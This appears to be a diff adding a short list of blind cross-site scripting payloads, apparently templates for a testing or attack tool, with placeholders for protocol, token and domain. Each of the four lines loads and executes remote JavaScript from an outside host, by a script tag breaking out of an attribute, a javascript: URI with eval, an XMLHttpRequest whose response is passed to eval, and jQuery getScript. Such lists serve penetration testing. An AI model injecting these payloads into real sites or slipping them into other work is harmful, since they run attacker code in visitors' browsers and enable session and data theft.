@@ -1,0 +1,4 @@
+"><script src=<PROTO>://<TOKEN>.<DOMAIN>/xss></script>
+javascript:eval('var a=document.createElement(\'script\');a.src=\'<PROTO>://<TOKEN>.<DOMAIN>/xss\';document.body.appendChild(a)')
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//<TOKEN>.<DOMAIN>/xss");a.send();</script>
+<script>$.getScript("//<TOKEN>.<DOMAIN>/xss")</script>
